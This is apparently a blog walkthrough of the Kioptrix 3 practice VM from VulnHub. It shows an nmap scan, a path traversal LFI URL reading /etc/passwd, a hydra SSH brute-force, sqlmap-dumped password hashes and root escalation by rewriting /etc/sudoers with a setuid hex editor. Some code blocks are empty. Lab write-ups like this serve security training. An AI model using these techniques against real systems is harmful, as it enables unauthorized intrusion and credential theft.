Kioptrix 3 VM can be downloaded [here](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)  

## 0\. Get VMs IP

```console
root@kali:~# netdiscover -r 192.168.1.0/24  
  
 Currently scanning: Finished!   |   Screen View: Unique Hosts  
  
 271 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 16260  
 _____________________________________________________________________________  
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 


  -----------------------------------------------------------------------------  
 192.168.1.70    c4:e9:84:10:d3:5e      5     300  TP-LINK TECHNOLOGIES CO.,LTD. 


**...** 
```
  
Make sure you update your hosts file by adding `192.168.1.70 kioptrix3.com` to the following:  

  * Linux: `/etc/hosts`
  * Windows: `C:\windows\system32\drivers\etc\hosts`

## 1\. Enumeration

#### TCP Ports enumeration
```console
root@kali:~# nmap -sV 192.168.1.70  
  
Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-20 22:58 EST  
Nmap scan report for kioptrix.com (192.168.1.70)  
Host is up (0.000055s latency).  
Not shown: 998 closed ports

80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)**  
MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds  
```

Only SSH service and a webserver are running. A full TCP scan yield the same results.  
  
Attacking SSH service is kind of pointless unless version is vulnerable and/or you found a valid username for bruteforcing a password.

## 2\. Web server

As usual, run Nikto while you're manually poking around the website.  
 
```console

```    

  
Since there's a phpMyAdmin portal available, let's try some default username/password.  
"admin" with an empty password worked! Unfortunately, "admin" user has only access to `information_schema` and didn't reveal any credentials we can use to get a shell through SSH.
  
After poking through the site it seems to contain 2 components:  

  * **Ligoat Security blog**
  * **Gallery (Kioptrix3.com/gallery)**

Before trying out our webapp pentesting skills, it's worth noting that we found a username in the second blogpost!

```    
Welcome loneferret! and don't forget to fill in your time sheet.  
```
  
This piece of info will result in getting limited shell, follow-up here.  

#### LFI

After spending some time I wasn't able to find a file inclusion vulnerability. After I rooted the VM I found out it is indeed possible.

Doesn't work:  

```
http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd   
```    

Works:  
```
http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html  
```

Content of /etc/passwd (which confirms that loneferret exists):

#### **LotusCMS**

You might've figured out already, there's a CMS serving data for the website called LotusCMS, it also happens to have very serious vulnerabilities:  

```console
root@kali:~# searchsploit lotuscms  
----------------------------------------------------------------------------------------- ----------------------------------  
 Exploit Title                                                                           |  Path  
                                                                                         | (/usr/share/exploitdb/platforms)

----------------------------------------------------------------------------------------- ----------------------------------  
```
  
Getting a shell out of this vulnerability in action is here.  

_____________________________________________________________________________

## 3\. Getting a shell!

#### Method 1: Bruteforcing SSH for loneferret

We already know the user exists via a blog post mentioned earlier.

  
IMPORTANT:_ When running `hydra`, make sure you include `-t 4` parameter, otherwise the service could get overloaded and not all passwords will be tested properly.  

```console
root@kali:~# hydra -e nsr -l loneferret -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 192.168.1.70 ssh -t 4  
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
  
Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-21 23:02:32  
[DATA] max 4 tasks per 1 server, overall 64 tasks, 100003 login tries (l:1/p:100003), ~390 tries per task  
[DATA] attacking service ssh on port 22  
[22][ssh] host: 192.168.1.70   login: loneferret   password: starwars  
1 of 1 target successfully completed, 1 valid password found  
Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-21 23:03:27  
```
  
We did find a valid login! Are there other ways to get a shell?  
  

#### Method 2: LotusCMS eval()

Although I'm not a fan of using metasploit for those VMs it was too tempting...  

```console
root@kali:~# msfconsole  
msf > search lotuscms  
...

```    

#### Method 3: SQL injection through Gallery

`kioptrix3.com/gallery/gallery.php?id=1` is vulnerable to SQL injection through the `id` parameter.  
There are multiple ways to exploit this vulnerability, easiest is just using sqlmap. Ultimately you'll find MD5 hashes for a couple of accounts. Password for loneferret matches the one we found through hydra!  

```    
Database: gallery  
Table: dev_accounts  
[2 entries]  
+----+------------+---------------------------------------------+  
| id | username   | password                                    |  
+----+------------+---------------------------------------------+  
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |  
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |  
+----+------------+---------------------------------------------+  
```    

  
Also note that with the second method, you can do some enumeration on the machine and you'll find the following file particularly interesting:
`/home/www/kioptrix3.com/gallery/gconfig.php` as it contains phpmyAdmin credentials (`root`/`fuckeyou`) with enough privileges to find the same database discussed earlier. These creds don't work for SSH though.  

_____________________________________________________________________________

## 4\. Privilege Escalation to root

Now that we're inside let's find some useful data. I logged in with loneferret's credentials.  


```
root@kali:~# ssh loneferret@192.168.1.70  
loneferret@192.168.1.70's password:

Hello new employee,  
It is company policy here to use our newly installed software for editing, creating and viewing files.  
Please use the command 'sudo ht'.  
Failure to do so will result in you immediate termination.  
  
DG  
CEO  
loneferret@Kioptrix3:~$  
```
  
Hmm, what's that `ht` file they want us to run?  

```console
loneferret@Kioptrix3:~$ which ht
/usr/local/bin/ht  
loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht  
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht  
```    

Oh, so this file has `setuid` bit enabled, AND is owned by root. After poking with the tool I realized it's a HEX editor. This means we can edit any file we want even it's owned by root!  

What's the easiest file to edit and get root you ask?  
  
It's `/etc/sudoers`.  
  
Be extremely careful while editing the sudoers file, saving it in bad format might break stuff and make you unable to use the su command. How do I know? Because I broke my VM, __twice__..  
  
First, you might need to update the environment variable TERM.  

```console
loneferret@Kioptrix3:~$ sudo ht /etc/users  
Error opening terminal: xterm-256color.  
loneferret@Kioptrix3:~$ export TERM=xterm


loneferret@Kioptrix3:~$ sudo ht /etc/users 
```

Next, change mode to text by pressing F6, you'll notice the following line:  
```console
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht  
```   

We can simply replace the "!" by a space (0x20), so running /usr/bin/su gives
us root.  

```console
loneferret@Kioptrix3:~$ sudo /usr/bin/su  
[sudo] password for loneferret:   
sudo: /usr/bin/su: command not found  
loneferret@Kioptrix3:~$ which su  
/bin/su  
```

Oh, no wonder it didn't work. su is under `/bin/su`, not `/usr/bin/su`...  
Final edit makes `/etc/sudoers` file contain:  
```
loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht  
```

```console
loneferret@Kioptrix3:~$ sudo /bin/su  
root@Kioptrix3:/home/loneferret# whoami  
root  
```    
  
It worked! We got root! Where is our flag?  

```console
root@Kioptrix3:/home/loneferret# cd /root

Good for you for getting here.  
Regardless of the matter (staying within the spirit of the game of course)  
you got here, congratulations are in order. Wasn't that bad now was it.  
  
Went in a different direction with this VM. Exploit based challenges are  
nice. Helps workout that information gathering part, but sometimes we  
need to get our hands dirty in other things as well.  
Again, these VMs are beginner and not intented for everyone.   
Difficulty is relative, keep that in mind.  
  
The object is to learn, do some research and have a little (legal)  
fun in the process.  
  
  
I hope you enjoyed this third challenge.
